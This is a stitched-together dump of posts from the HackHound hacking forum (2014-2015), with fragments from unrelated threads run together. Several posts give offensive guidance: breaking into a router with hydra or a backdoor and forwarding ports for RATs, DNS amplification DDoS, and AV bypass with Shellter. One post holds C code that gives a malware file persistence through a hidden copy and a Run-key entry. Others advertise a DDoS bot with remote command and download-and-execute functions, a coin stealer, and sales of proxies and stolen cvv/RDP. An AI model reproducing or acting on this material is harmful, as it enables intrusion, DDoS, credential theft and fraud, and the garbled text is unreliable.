"(HELP)  REVERSE CONNECTION - Networking, Firewalls, Routers and Switches - HackHound",help-reverse-connection,x58,6/19/2014 0:00,This really makes me wonder if you even know what you are talking about. I guess it was just an open network instead of you hacking it. But whatever i don't know. Anyways first thing you want to do is to get yourself a static local ipv4 address on this router. If dhcp is enabled you should use hydra to bruteforce the gateway's web control panel basic auth/login form or find a backdoor in the router and get in it this way.. Then add yourself (use a fake mac address of course) to the static dhcp list. So other users won't notice anything. And then just forward a port you like to this static local ipv4 address(the one you are using and added to the static dhcp list) and add it to the no-ip account. Now you can connect to this externally on this port e.g (example.no-ip.com:1337) for all your rats and shit....... So you can do all the stuff through a windows VM over wlan0. And use the host on eth0(your own wired network) for example.,Advanced

MalDet calculates a probability for a file to be malicious based on anomalies in the Portable Executable format. How does it do it? Certain anomalies are more prevalent in malware than in normal files.

"Dns ddos amplification attack - Networking, Firewalls, Routers and Switches - HackHound",dns-ddos-amplification-attack,Tigerass,6/24/2014 0:00,"I'll try. If you send some data from your pc into the internet, there must be some information in it where it cames from and where it went to. This is necessary because you pass many ""switches"" where your packet is redirected to it's korrect destination. And ofc. the answer has to go the way back the same way. Like writing an letter to some unknown person you have to write where it comes from and where it should be sent. So basically there is some destination ip and some origin ip in every tcp packet you send. The internet house numbers. Now we modify the origin ip (where the response shall be sent) to our ddos targets one. So everytime you send some request the response will now be redirected to your ddos target. If you send the letter with your neighbours address as sender, he will receive the reply from the unknown person. Like ordering parcels for someone else. Now the interesting part. If you send some short requests to some nameservers for e.g. (ips are known) the response can be pretty long. ~ an factor of 50. Write in the letter for example some request to send an phone book back. Or that you definitely take the old tube-screen tv. You don't have to care about the response because you don't have to handle it. Your target has . You just increased your available bandwith of the factor 50.

All desktops on old network were fine on internnet and email ( lan direct to router ). When we moved, I keep getting dropouts on internet ( about 7 per hour ) and email client ( Oulook 2010 and windows live mail ) takes ages to negotiate directly with mail server and send emails. About 30 seconds + for plain text email.... Router configured basically the same as old one and no changes to pc's on network. I have had 3 routers supplied by isp but all the same. The engineer who wired up company has been on site to check where copper cables come into company and has wire up master socket for internet and email still take ages on sending. I think its either the cabled coming in are degraded and not reliable or the router / isp is stopping the email programs communicating effectively.

This was because of some issues with the provider. I was waiting for them to response on my ticket. So I could use the smtp smart relay of the provider so the mail server won't have any issues with possible lists from the previous owner of the ip or some mail servers blocking the entire ip range because of some people who abused smtp within this range. For now it mostly works on a few mail server left that are blocking the range were our ip is in. A great thanks to our beloved spammers that previously abused it.. Meanwhile we are using our own server for now, I reactivated the ticket and waiting for the provider to response on it. And I have also sent a unlist request to FABELSOURCES what seems to be resolved at the moment of writing this board update. Hopefully Hotmail and a few others will work within a day or two when the mail servers update their blacklists. Sorry for the inconvenience. update 1 [10-7-14] Hotmail still bounced back with 550.

Shellter - Dynamic ShellCode Injector Tool - Malware Related Tools - HackHound,shellter-dynamic-shellcode-injector-tool,Cypher,8/14/2014 0:00,"Hey guys, if you are interested in AV Bypass check this project. So what is Shellter? Shellter is a dynamic shellcode injection tool, and probably the first dynamic PE infector ever created. It can be used in order to inject shellcode into native Windows applications (currently 32-bit apps only). The shellcode can be something yours or something generated through a framework, such as Metasploit. Shellter takes advantage of the original structure of the PE file and doesn’t apply any modification such as changing memory access permissions in sections (unless the user wants and/or he chooses Basic Mode), adding an extra section with RWE access,and whatever would look dodgy under an AV scan.

The new tool isn't sending to ftp anymore, sniffing etc. makes it dangerous, and I am learning php nearby so I coded a little script to upload wallets to the server.

For general SEO/automation tasks this is generally fine and this is the ""target"" type of customer of the service. I think expecting anything to last more than this for such low price is just being sort of naive :-) Quick calculation, if you expect the proxy to be online 24/7 then you'd need a dedicated vps.. vps is around 5$ per month etc. 5$ per proxy..plus geo zones.. etc :-) Of course I can also provide long lasting dedicated-private service for countries you need (e.g 700 german ips online fulltime on same ports), but in such case you will have to pay ~5-10x more (starting at $150 per month for unlimited access) @pongi what server were these proxies from? s1? s2?

Humble Bundle Challange - Challenges - HackHound,humble-bundle-challange,a649b9e0,9/9/2014 0:00,"Can you maybe give me a clue? Is the key itself in the base64 decoded message maybe? Or am i going to the right way? The key is completely unknown. Let me explain how repeating key xor works. If you took the plain text ""The quick brown fox"" and used the word ""cow"" for the key you would encrypt by breaking the phrase and key both down into individual letters and repeat the key as many times as needed to cover the entire plain text. The quick brown fox cowcowcowcowcowcowc You would then xor each each letter of the plain text with the letter below it. This would produce the characters (in hex): 37 07 12 43 1e 02 0a 0c 1c 43 0d 05 0c 18 19 43 09 18 1b Xor is the reverse of itself so you reverse this process by xoring these characters (or bytes) by the key again. To brute force you can simply try each possible key and check the plain text for something that stands out as obviously a real message. Or compare it to the frequency of letters in the english language to automate it. I kept the key small enough to keep this practical. Edited by a649b9e0, 09 September 2014 - 09:44 PM.",Newbie

Humble Bundle Challange - Challenges - HackHound,humble-bundle-challange,IamLupo,9/10/2014 0:00,"The key is completely unknown. Let me explain how repeating key xor works. If you took the plain text ""The quick brown fox"" and used the word ""cow"" for the key you would encrypt by breaking the phrase and key both down into individual letters and repeat the key as many times as needed to cover the entire plain text. The quick brown fox cowcowcowcowcowcowc You would then xor each each letter of the plain text with the letter below it. This would produce the characters (in hex): 37 07 12 43 1e 02 0a 0c 1c 43 0d 05 0c 18 19 43 09 18 1b Xor is the reverse of itself so you reverse this process by xoring these characters (or bytes) by the key again. To brute force you can simply try each possible key and check the plain text for something that stands out as obviously a real message. Or compare it to the frequency of letters in the english language to automate it. I kept the key small enough to keep this practical. The hint the key is small enough. Thats what i needed to know! i got it now! http://bringvictory.com/ This also proves my script was working,.. but problem was the possibilities. I must be hounest. I didn't thought of frequency of letters check. In this case i found it by bruteforce the first 4 keys and check the possibilities.

I can't answer your first question bc I dont have much experience with Metasploit and how the payloads are generated. But in reference to your second, you're just looking for C/C++ code to copy a file to %appdata% and add reg key? If so, this is an easy task. 1) get current file path with GetModuleFileName with NULL parameter for module 2) call SHGetFolderPath (if you want to use multi byte/char) or SHGetKnownFolderPath (if you want to use Unicode/wchar), with CSIDL value corresponding to %appdata% 3) create your desired file path using the above value, for example you want to have the file name be file.exe. You append file.exe to above path using sprintf, strcat, or equal (ex: sprintf_s(Filepath, ""\\file.exe"");, you would need for Filepath to have appdata path before doing this) 4) call CopyFile to copy file to your desired location in appdata 4) open desired regkey with RegOpenKey(Ex), create key with RegSetValue(Ex) with your new file path Hope this is what you were asking about lol Edited by friendlycow, 24 September 2014 - 01:31 AM.",IntermediateMember

I get a lot of errors specifying that the ""identifier '' is undefined"", and ""argument of type '*' is incompatible with parameter of type '*' "" I use MVC++ btw. However, I found this example somewhere: int Install() { char currentPath[MAX_PATH]; char installPath[MAX_PATH]; GetTempPath(MAX_PATH, installPath); strcat(installPath, NAME); strcat(installPath, "".exe""); GetModuleFileName(NULL, currentPath, MAX_PATH); if(strcmp(installPath, currentPath) != 0) { if(!CopyFile(currentPath, installPath, FALSE)) { return EXIT_SUCCESS; } ShellExecute(NULL, NULL, installPath, NULL, NULL, SW_HIDE); return EXIT_SUCCESS; } HKEY hKey; DWORD dwDisp; RegCreateKeyEx(HKEY_CURRENT_USER, ""Software\\Microsoft\\Windows\\CurrentVersion\\Run"", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisp); RegSetValueEx(hKey, NAME, 0, REG_SZ, (LPBYTE)installPath, strlen(installPath)+1); RegCloseKey(hKey); MessageBox(NULL, currentPath, ""Hello from..."", MB_OK); return EXIT_SUCCESS; } And I run this function as the first thing in WinMain: I seems as if the program crashes if it can't establish a connection with the remote host (me). I guess this can't simply be fixed by implementing a loop, as the program itself have no update on the state of the shellcode, right? Is there any way of knowing if a connection has been established, and if not - then run the function again? Or maybe run the function every 5 minutes, but won't that terminate and interrupt any on-going action like keylogging, file transfer and so on? Back to the Install function. It successfully copy's the file to the AppData/Local/Temp with a name of ""Installed"" as specified in the code. However, it does Not add itself to the registry. How do I debug this behavior? I really like the different types of payloads in Metasploit, and would rather use them instead of RATs. You can always execute a RAT on the client box if that's preferable later.

Execute Shellcode Metasploit In Heap - Resources - HackHound,execute-shellcode-metasploit-in-heap,friendlycow,9/24/2014 0:00,"You don't need to call RegCreateKey, should just be able to call the API to open "".....blahblahblah\\Run"". Then RegSetValue to add your subkey. Registry works in keys and subkeys, the ...\\CurrentVersion\\Run is a registry key, go to it in regedit and see for yourself. There will (probably) be multiple entries in there, with different names and paths. These are subkeys, your goal is to create a sub key for your file under the Currentversion\\Run key and it is done using RegSetValueEx. But before calling RegSetValueEx to open up the Run key. So you have two API's that have to do with the registry, these are the two which can be going wrong. Now if you read MSDN pages on RegOpenKeyEx and RegSetValueEx, you will see that both of these return the value ERROR_SUCCESS if they execute properly. So in order to see where they go wrong, use an if statement like this: if (RegOpenKeyEx(...) != ERROR_SUCCESS) { // FAILED } Same with RegSetValueEx. Best thing to do is have code to call GetLastError() if the API fails. So throw this code inside your if statement in the case that the call fails (returns something other than ERROR_SUCCESS): DWORD LastError = GetLastError(); printf(""%ld"", LastError); // read documentation of printf, %ld is used to signify DWORD in printf getchar(); This will print the last error code grabbed by the system, google windows error codes to see what the one it returns means...

Conduit Search Protect Disinfector - Team Projects - HackHound,conduit-search-protect-disinfector,Deque,10/17/2014 0:00,"ConduitSPKiller v1.0 Description: Removes Conduit Search Protect (this is not the same as Conduit Toolbar!) Important! This will reset Internet Explorer and Firefox to default. Your settings will be lost. Backup your files and your registry! I take no responsibility if you loose data, because you forget to create backups. A soft reset is planned for future versions. What is Conduit Search Protect? Conduit Search Protect comes often bundled with installers of other programs, e.g., PowerISO. It is classified as potentially unwanted program (PUP), meaning, no one with a right mind would actually want that on his/her PC. Conduit Search Protect sets your browser's default home page, new tab settings and search engine to search.conduit.com or www.trovi.com. It is hard to get rid off and blocks any attempts to change the browser settings back. Other symptoms are unwanted pop-up and in-text advertisements. Conduit Search Protect infected PCs usually have an icon showing a blue shied with a white magnifying class in your taskbar. Conduit Search Protect can cause severe problems after using the Conduit Uninstaller, it may even render your system unbootable (see link) Tested on: This version was only tested for Windows XP so far. You can use this script for other operating systems as well, however, it is possible that not all remnants can be removed in that case. Usage: Backup important files Backup your registry (e.g. using ERUNT) Copy & Paste the source into notepad. Save as ConduitSPKiller.bat Run. Note: A command window will pop up and close again.

If you wish to get more credit please don't hesitate to contact us directly on jabber and we will be glad to assist you. We can add you credit to test bulk service or per socks purchase. Privacy Any requests for client information by a third party or law enforcement will be denied. We do not keep IP Address records. All you need to create and access your account is a username and password. Because we do not require your name, phone number, email address, or any other personal information, it is almost impossible to prove ownership of an account. This is great for those concerned about privacy, but bad for those who forget their passwords often. Write down your username and password! Payments All payments are done using Bitcoin. Feel free to mix coin to our system. We will never accept PayPal. If you have never used Bitcoin and need help making a payment, contact us over jabber or using contact form.

Our credit is a dollar based currency that can be used to buy products. When you purchase a product credit is deducted from your account. There is no minimum or maximum deposit amount. Daily Proxies Daily Proxies are paid for by the day. You can filter proxies by country, state, and city. When you purchase one, credit is deducted from your account. If the proxy dies within 15 minutes of purchase, our system will automatically refund the deducted credit. After 24 hours the proxy will expire and be removed from your account. If you want to use it for another day simply purchase it again. Proxy Packages Proxy Packages are for those wanting access to a large network of proxies for an extended period of time. Packaged proxies rely on a switching system tuned for automation software. Every proxy allows for unlimited connections. Unlike our competitors, when a packaged proxy goes offline it is replaced with an online one instantly. Not 10 minutes later! Unlimited Connections The servers our systems rely on are all quad core, dedicated, unmetered, and have 100 Mb connections. All of our proxies accept unlimited connections and requests. There is no delay in proxy response due to another connection. All info can be found at http://www.reverse.su/information.php FAQ # How to use individual socks and how to use packages? - Individual socks 1) Login to Your account, go to Daily Proxies 2) Select Country, State, City if available 3) Click on IP to buy it, You will get IP : PORT - PASSWORD 4) Set in Browser settings IP : PORT.

This application enables automated port switching if a proxy goes offline and converts all http/https/socks4 traffic into socks5 authenticated for our servers. In case you cannot use Proxifier for whatever reason or it does not work with Your application it is possible to run it on a Windows RDP box and it will retain the same functionality. # What are the pricing plans for packages or individual socks, etc? - All packages prices are available online at http://www.reverse.su/packages.php We offer Tier 1, Tier 2 and Tier 3 socks Each plan comes in individual packages of 50, 100, 250, 500, 1000 ports (if You need more contact us for discount) Each package can be purchased per weekly basis or monthly basis. # How can I contact support? - Add them on one of the following JIDs or all.

Use a vm in another vnet (or dedicated nic on another gateway) with a vpn or no Ethernet connection at all. Test the sample (in my case) any file i get even from people i trust, they first go through a simple test. Multiple online sandboxes Virustotal SHA1/MD5 in search engine (just in case) A look at the import/exports and strings Then i test it in a more ""realistic"" environment a vm (win7) to see what it really does. If people would simply take the time to carefully follow this simple guide, no worries are needed at all and the chance to get butt raped by some noob or nerdy 'hacker' using a free .net crypter to hide his darkcomet stub is likely to happen if not at all.

PureBasic x86/x64 AIO v5.30 - Development Software - HackHound,purebasic-x86x64-aio-v530,Hess,11/14/2014 0:00,"New release of PureBasic , hope You'll like it. From developer site: PureBasic is a native 32-bit and 64-bit programming language based on established BASIC rules. The key features of PureBasic are portability (Windows, Linux and MacOS X are currently supported), the production of very fast and highly optimized executables and, of course, the very simple BASIC syntax. PureBasic has been created for the beginner and expert alike. We have put a lot of effort into its realization to produce a fast, reliable system friendly language. In spite of its beginner-friendly syntax, the possibilities are endless with PureBasic's advanced features such as pointers, structures, procedures, dynamically linked lists and much more. Experienced coders will have no problem gaining access to any of the legal OS structures or API objects and PureBasic even allows inline ASM. The main features of PureBasic: - Huge set of internal commands (1400+) to quickly and easily build any application or game - All BASIC keywords are supported - Very fast compiler which creates highly optimized executables - No external DLLs, runtime interpreter or anything else required when creating executables - Procedure support for structured programming with local and global variables - Full unicode support - Access to full OS API for advanced programmers - Easy but very fast 2D game support through dedicated libraries (DirectX, SDL, ...) - Easy and high quality 3D support based on OGRE - Optimal use of the available hardware by using highly optimized (assembly) commands - Source code is portable between Windows, MacOS X and Linux - Dedicated editor and development environment - Powerful integrated debugger and profiler to easily trace and analyze code Specific features depending on the OS: Windows: hxxp://www.purebasic.com/introduction_windows.php Linux: hxxp://www.purebasic.com/introduction_linux.php MacOS X: hxxp://www.purebasic.com/introduction_macos.php PureBasic v5.30 changelog: Spoiler 23th July 2014 PureBasic 5.30 (all OS) - Added: New ""Issue"" tool for IDE to build todo/issue lists easily from comments. - Added: JSON library - Added: ParseXML(), ComposeXML(), InsertXMLArray/List/Map/Structure(), ExtractXMLArray/List/Map/Structure() to XML lib - Added: OpenGLGadget() with native opengl commands and constants support - Added: ExamineRegularExpression() and related commands to process regex matches step by step - Added: ClipOutput(), UnclipOutput(), SetOrigin(), GetOriginX(), GetOriginY() - Added: GetWindowData(), SetWindowData() - Added: AllocateStructure(), FreeStructure() - Added: #PB_Default support to WindowBounds() to reset min/max size - Added: 'Format' parameter to Read/WriteProgramString(), WriteProgramStringN() and ReadProgramError() - Added: /PREPROCESS compiler flag to create a big single source with all macros, compilerif and file include resolved.

At this point, I'm confused, I don't know what to do and that's why I'm asking for your help, what should I do? Hello, uchdollar. Welcome to the HH botnet-hotline. I have been assigned to help you with your issue. Your ticket-id is 627713. In order to help you, can you provide me more technical details about the VPS you used for the command-and-control (C&C) server and the PC you tried to install the malware on? From there on, it's easier to help you as then we know more about the platform you are using and what might cause the issue for you. If you have any further questions, I would be happy to assist you. In appreciation of your interest, I would like to offer you 10 percent discount on your first order and invite you to become one of our satisfied customers. Remember, your satisfaction is our #1 priority! Best Regards, Testacc, HH botnet-hotline If you wish, give us a call, 020 7601 2222 Spoiler I surely hope you understand sarcasm. If you don't know how to use it, maybe it's not for you. It's old and crap anyway. Unless you're using it for researching purposes, which I doubt because of your post",IntermediateMember

Even thou I am not very good programmer I enjoy reading and writing code daily. Second thing that interest me is working my way into servers and/or databases I remember when I discovered Backtrack it was best feeling ever and cracking my first wi fi . I switched to Linux completely few months ago (who needs Windows when you have Wine right? no? ok.) I currently work with Parrot Security OS and I like it very much, especially the GUI.

I accept PM and WMZ only, money first as when you buy cvv/RDP. I will provide tracking information within 2-3 business days.

Instead of using ""old"" macros (Use static global variables which results into static linkage so it's the same result when you use macros but it results into better style).

It contains among other things an optimizing C compiler, a macro assembler, a linker, a resource compiler, a message compiler, a code signing utility, a make utility and an install builder. It also contains an integrated development environment (IDE) with project management, debugger, profiler, source code editor, and resource editors for dialogs, menus, string tables, accelerator tables, bitmaps, icons, cursors, animated cursors, animation videos (AVI's without sound), versions and XP manifests. The compiler is originally based on LCC, but since then enhanced with support for C99 and C11, a global optimizer, a new register allocator, a function inliner, intrinsic functions, and many Microsoft C extensions. Features: Support for 32-bit Windows (X86) and 64-bit Windows (X64). Support for the newer C standards C99 and C11. Support for most SSE, SSE2, SSE3, SSSE3, SSE4.1, SSE4.2, AES, AVX, and AVX2 intrinsics (X64 only). Integrated source code editor with call tips and symbol browsing. Integrated source-level debugger. Integrated sampling profiler. Project management. Inline assembler for X86 (not X64, since intrinsics are better). Integrated resource editor. Integrated bitmap, icon and cursor editor. Integrated animated cursor and video editor. Integrated hex-dump editor. Support for custom controls in the dialog editor. Support for custom project wizards. Pelles C is freeware. Screenshots: source code editor c code debugging x86 asm code debugging You can download last vesion of Pelles C from official site. I prefer to use Pelles C because It has compatible with Visual C++ but not so giant like monster. Many another projects use parts of Pelles C package.

Because most of what you say makes no sense, and iCode is i think just a bit tired of all the other people who do in fact copy/paste code and then when it doesn't work come here to ask for help. This might not be your case, but I'm not sure. I have not seen the code either and the question you ask and the way you write it makes the reader able to see that you miss some basic knowledge in coding vba. And regarding the returning path of Rundll32. I think it's normal ?? I mean Rundll32 is executing the code inside the dll. A dll is a extension of functionality, not an application with gui/cli etc. Rundll32 itself is the main executable responsible for jumping intro the ep and executing the function(s) in your dll.

Load on CPU and ram is very powerful. - does not attract attention to UAC Windows Firewall - can install port, referal and cookies individually for each attack - Supports up to 10 targets simultaneously - has a very low load on the cpu with the new, complex system parsing Teams (all analogs parsing passes within a function in multiple threads - it's extra work load on the processor. New bot enters all data in the array before the attack and come ready function parameters: address, port, referral, etc.) - has enormous power output of more than 1500 http (and more 30,000 udp) requests per minute due to direct interaction with network drivers, even on Windows Desktop! (Only when using winsock) is about 10 times more than some analogues and several more top (on this indicator) competitors. - in the control panel are: the number of requests per minute, right in the system, the version of the system. - Supports bypassing Cloudflare protection (!) and many other, more simple. - support and slow get slow post! mode - indicated in the packet header off the cache (cache-control: no-cache), which increases the load on the server. - Bot protection of panel.

Detection: Validation build (without crypt and packing) only 3 AV’s of all triggered suspicion (avira, clamav, vba32). during local tests Kaspersky, nNod32, Drweb, Avast all missed file in 100% of cases. Attack modes and commands: As the system is a professional syntax with commands, this seems complicated, but only at first glance =) • dd1 basic operation by http protocol method get, using sokkety. support *** cookies and $ $ $ ref and allows up to 10 targets simultaneously (separated by "";""). the fastest search volume attack. Example: DD1 = http://ya.ru cookies *** $ $ $ referal; http://mail.ru cookies2 *** $ $ $ referal2 • dd2 the same treatment as dd1, only the method of post. added optional parameter @ @ @ post_data. also supports up to 10 goals. Example: dd2 = http://forum.ru/index.php *** cookies $ $ $ referal @ @ @ login = yyy & password = hhh, this team posted a username and password yyy hhh a script • dd3 attack http get method using the system library wininet.dll. good old attack used in many delphi bots. slow due to the limitations of desktop windows. not support the referral and cookies, supports up to 10 targets. Example: dd3 = http://host.com/script.php • dd4 attack http post method using the system library wininet. the same as dd3, only post. Example: DD4 = @ @ @ http://host.com/script.php @ @ @ = login & password = yyy hhh • dd5 icmp attack (pings). supports up to 10 targets. Example dd5 = 198.168.0.1; 199.0.0.1 • dd6 udp attack. supports up to 10 targets. mandatory parameters: port and text. Example: dd6 = 192.168.0.2:27015 @ @ @ flud_text • dd7 attack http get method using the system library urmon.dll average speed attack, supports up to 10 targets and does not support cookies and referal • cfa command bypass the security cloudflare (!). used only during dd7. This is simple - the bot executes java script gets the desired cookie and cloudflare considers requests made dd7 authorized. Example: dd7 = http://site.ru/index.php, then (after fifteen minutes) cfa = http://site.ru/index.php • cmd command is executed on the command interpreter cmd.exe on the local machine. does not stop the execution of other commands. Example: cmd = net user goodwin / add • exe command to load and run the exe file. does not stop the execution of other commands. file will be saved under the same name, under which he was on the Internet. made three attempts to download a file.

Spoiler procedure TForm1.TCPExecute(AThread: TIdMappedPortThread); begin if (pos('GET',athread.NetData)) or (pos('GETS',athread.NetData)) or (pos('HEAD',athread.NetData)) or (pos('POST',athread.NetData)) or (pos('PUT',athread.NetData)) or (pos('DELETE',athread.NetData)) or (pos('TRACE',athread.NetData)) or (pos('SEARCH',athread.NetData)) or (pos('OPTIONS',athread.NetData)) 0 then begin AThread.NetData:= AThread.NetData; end; When i try to browse for example http://hackhound.org , the request /raw is normally like below and normaly always finished with line ending ""#13#10#13#10"" [0d0a0d0a] - Spoiler GET http://hackhound.org/ HTTP/1.1#13#10 Host: hackhound.org#13#10 .......................................... ........................................... Connection: keep-alive#13#10#13#10 Spoiler Here I want to finished all HTTP Request with line ending ""#10#10"" , instead of line ending ""#13#10#13#10"" . The request of Netdata will be always like below - Spoiler GET http://hackhound.org/ HTTP/1.1#13#10 Host: hackhound.org#13#10 .......................................... ........................................... Connection: keep-alive#10#10 Spoiler I have seen many expert here from few days . Please help me . How can I finished a HTTP Request with line ending ""#10#10"" , instead of line ending ""#13#10#13#10"" [0d0a0d0a] ? Thanks",Newbie

Universal CoinStealer by Becks - Malware Related Tools - HackHound,universal-coinstealer-by-becks,x58,1/13/2015 0:00,"Dunno, hta files are working for me... I mean like only allowing your IP adress to the panel or like said before password protected. It is also possible to do from PHP then? Why use htapassword / htaccess files if you can do the same in your web server configuration... Do i really need to repeat this over and over again? You should avoid using .htaccess files completely if you have access to web server main server config file. Using .htaccess files slows down your http server. Any directive that you can include in a .htaccess file is better set in a Directory block, as it will have the same effect with better performance. And about ionCube, why? Is the panel private or does not contain the sql infos in them, for what reason would you do it? It might be handy for just this fact if you don't know about secure php programming and if you're not sure if there is a backed in backdoor or bug. But the main problem with ionCube is that you will lose performance..",Advanced

The historical record of HH - Hello World - HackHound,the-historical-record-of-hh,x58,1/26/2015 0:00,"Hi, Thanks for reading this thread. I made this thread to make a part of the historical record of Hackhound readable for everyone here. Hackhound is in it's second or third generation right now (as of 26-1-2015). It was passed on to people who are either die hard fans or either computer enthusiastic people like me. Hackhound had several owners over the past years since it's existence (begin 2008). The Hackhound as how it is now is online since 2012 (Not the one from 2008 - 2011 that used fora CMS SMF aka Simple Machine Forums) if your account was made before this year it can only mean two things. Your account was either removed duo to inactivity or it was never registered in this database (since 2012). Time frame in a nutshell: Begin 2008 - Carbon times (the 'awesome' times everybody talks about) they then used phpbb cms but switched to smf. Somewhere in 2009 - Still running, Carbon still active, other admins and mods are in the game helping the fast growing community. End of 2009 - Hackhound got 'hacked' (actually hijacked) because some admin presumably got infected, some jack ass messed up the board. The mess caused by the fool was later on recovered. 2010 - The community came somewhat to an end because people who maintained it where busy in real life. Good people in the scene faded away because also in this time frame a lot of leechers and skids started to join the forums. 2011 - Community was closed Begin of 2012 - Community was brought back by two trusted old members which are still here as of today. 17-6-2014 - I took over the community (hosting, domain, the bills etc...), the reason for this was not to be c00l and/or 1337. I just want to keep the community alive, just like all of you want. The reason for the ex-staff to handle it over to me was because they didn't had time for Hackhound, as it requires quite some time. 2015 - Still up 'n running. The goal of me and all the other people here who help and contribute to Hackhound is to keep the community alive with helpful stuff that is useful for other to learn from and so forth. And to have fun with each other. I myself don't make any profits out of this community, this was never my intention. The community is like a hobby for me, just like most other here also have different hobbies in programming, exploit research and so on. Well this is just one of mine. Error? If i made a mistake according to an ex staff member or old member, feel free to use the report feature to ""edit"" this page (i will update it after approval).",Advanced

TheDownFoxNow - Wall of Shame - HackHound,thedownfoxnow,BullDog,1/31/2015 0:00,"banned for scamming here. I was pretty sure that it was TheDownFoxNow right away, because his email address is listed as a scammer on multiple websites, but I decided to gather some actual proof as well... Proof: The scammer sent this screenshot to his victim. Meaning, he pretended to be me, in order to gain trust and receive a payment up-front. Spoiler Information that we can gather from this screenshot: The approximate time the screenshot was taken (Friday, 30th between 7:42-9 AM GMT) We know that TheDownFoxNow was online in that timeframe, because he can be seen in the shoutbox. The theme used at the time was Haze. The default is DarkEnergy. The scammer visited my profile. So, summing up we have a timeframe of when the scammer must've been logged in to take the screenshot and we know that he used the theme Haze. Now, since he has obviously changed his theme back to default by now this information would be useless in the current state of the database. So I've looked at a backup from Friday, 30th 03:42 GMT instead. As you may notice, the backup was created a few hours before the incident. This doesn't matter much though, since we already know for sure that TheDownFoxNow was also online at the approximate time the scam took place. So let's look at the backup of the db and list all users that: performed any action on the site after 12:00 GMT on Th, 29th (let's be generous with the times here, just in case) AND had their theme set to Haze at the time. Spoiler In my opinion that, combined with the fact that he was listed as the last visitor of my profile and the fact that his email address was used for scamming before, should really be proof enough.",AdvancedMember

This worked beleive it or not up to about 4 months a go.

If I have coded ""X"" thing before with help (looking for documentation on google), and this ""X"" thing as helped me with what I need, then perfecto. If I need to use ""X"" again, well I dont need to google it, I know how to code it, or even another way to code it. What I cannot do Is code RunPEs or these certain memory snippets that are on here. That will probably always be too advanced for me, I dont think I have the brain.exe to do so. But I have coded mostly anything to do with crypters (The area im interested in) except the runpe (ok, the most important part, but I suck) The crypter I use is coded by me, and I doubt you will see anywhere on the internet the same source or even the same method of saving the crypted bytes, due to that its not copy and pasted.

Help or Guidence on ZoneID (ADS) - General Discussion - HackHound,help-or-guidence-on-zoneid-ads,Shackles01,3/18/2015 0:00,"Hi. When you download a file windows assigns to it an alternate data steam ""Zone.Identifier"", you can easily see this by going to the folder where the file is with cmd and doing dir with /r option. It can be removed with streams from miscrosoft. I have seen many people in malware able to bypass this ZoneID by removing it on execution and it never pops up, however there really isnt anything much on google about this. So whenever I try doing it, I still get the popup on first execution but it then dissapears on the rest. What im doing, is dropping microsofts stream file, using shell to execute it to delete the ads Zone.Identifier, so after this I get no more popups. Does anybody know a way of doing this without getting the first popup? I know its posible but I dont know if its posible in vb6, because I dont know how they are doing it. If somebody can at least point me in the right direction it would be great. Thanks.",Member

Viotto is back :) - Hello World - HackHound,viotto-is-back,TheHardRoad,4/9/2015 0:00,"Hi everybody! Actually I'm not a new member, but I have been inactive for a long time, more then 2 years so, I though it would be nice to pass here and say hello again! I have been known as Viotto before and have been active here on HackHound since 2008. A couple of years ago I noticed that my account and all my posts and releases have been deleted, probably due to the mess with the database I have been reading about. Anyways, very nice to see that finally last period it came back online and stable. Maybe if you are an old member of this forum you remember me, I posted quite a few different code and releases here, and I plan to release more soon! I have been inactive on the forums and on the scene last few years, since I have been very busy with my daylight job as software programmer and malware researcher in a company here in Italy. But now I am back, updating old projects and forging new ones and that's what it matters. For who doesn't know me, I am a C/C++, Delphi and VB6 programmer, passionate and specialized on malware, hacking and computer security of course. I have been releasing through years different programs and sources in this field. You can find all of this in my website which I still keep up. If you want to visit it I'll be pleased! http://breakingsecurity.net I hope that the community is still well active as it was few years ago! I am looking to give again some contribution to what has been one of my favourite, and one of the best hacking and security forums. See you around! - Viotto alias ~TheHardRoad~",Newbie

Then I'll write all monitored input to a buffer with cbuff = chr(kybstruct.vkcodes), then I'm using a timer to check if the buffer in x seconds/ms to see if it has reached the required length and content (A-Z,0-9) and write the data to the next line in a csv file with some prefixes to make it useful to read. The code works but it has a bug in it. When I debug the function it works fine, and in production it does too. But after some time the HIDs connected to the pc get stuck.

Fake FedEX mail - Malware Samples - HackHound,fake-fedex-mail,x58,7/6/2015 0:00,"Hey, I am a newbie to this field, can someone throw me some light on how does this Fake FedEx mail malware works ? Thank you. How it works? Dumb people execute the js file as they think the e-mail is real (which then gets executed by the default browser at first, the javascript) then the browser with all settings to default(like in most cases) runs thejs and it ""decodes"" itself and becomes a vbs script which uses msxml to downloads the malware with the privileges of the current user that opened the attachment and then it gets executes by the shell .run command. Then it calls back home to wait for a command or it simply already sends back all locally stored passwords to the c&c .. etc. The 'obfuscation' you see was used to get around static AV detections. If there was no 'obfuscation' it would have probably been picked up by the AV as most Anti-Virus software these days have a NDIS network filter, and scans/checks network traffic before it get rendered/executed in the browser to prevent a system from getting compromised. And by the way please don't bump up a old thread next time, look at the date. Just start a new topic next time and mention this thread in it. Thanks",Advanced

Recently i felt like having my own file manager to moniter my office workspace from home and also home from office. i will explain the situation.I hope you all have seen file manager in RAT'S . but it is client based . I need webbased file manager (php) and stub.exe when i run in office or home machine should work in background(normal process with NO GUI). Features i need: stub.exe muse be in c or c++ no need startup or anything fancy stub just be with file manager code only. next i need simple no fancy webbased php panel from which i can browse drives and perform ""browse drives"" ""delete"" ""rename"" ""upload"" ""download"" ""extract"" "".zip"" ""execute"" files features. (php panel with login ofcourse) so suppose if i run stub.exe on 10 or more machines then it should show each machine on webpanel and right clicking selected one should show above option. (to identify each machine you can get GUID from native API or registry key).This guid will show in webpane in clients connected to panel which will help me identify machine. stub in which i can write my webserver ip where the file manager panel is hosted. stub code must be UNICODE so it works on all os. if you have such project ready then tell me your price for it or how much to make one.I will need this in 20-25 days or maybe more but its ok even if more days takes. (must work from windows xp till windows 10) tell me price for project source and i can pay handsome amount of money by paypal bitcoin bank wire western union. I can pay good.

